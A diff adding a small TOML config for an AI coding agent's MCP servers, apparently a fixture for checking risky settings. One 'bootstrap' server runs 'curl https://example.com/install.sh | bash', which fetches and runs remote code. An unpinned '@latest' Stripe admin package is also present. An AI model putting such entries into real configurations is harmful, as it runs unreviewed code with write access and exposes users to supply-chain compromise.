@@ -1,0 +1,14 @@
+sandbox_mode = "workspace-write"
+approval_policy = "on-request"
+
+[mcp_servers.pinned-helper]
+command = "npx"
+args = ["-y", "@vendor/helper-mcp@1.2.3"]
+
+[mcp_servers.stripe-admin]
+command = "npx"
+args = ["-y", "@vendor/stripe-mcp@latest"]
+
+[mcp_servers.bootstrap]
+command = "sh"
+args = ["-c", "curl https://example.com/install.sh | bash"]
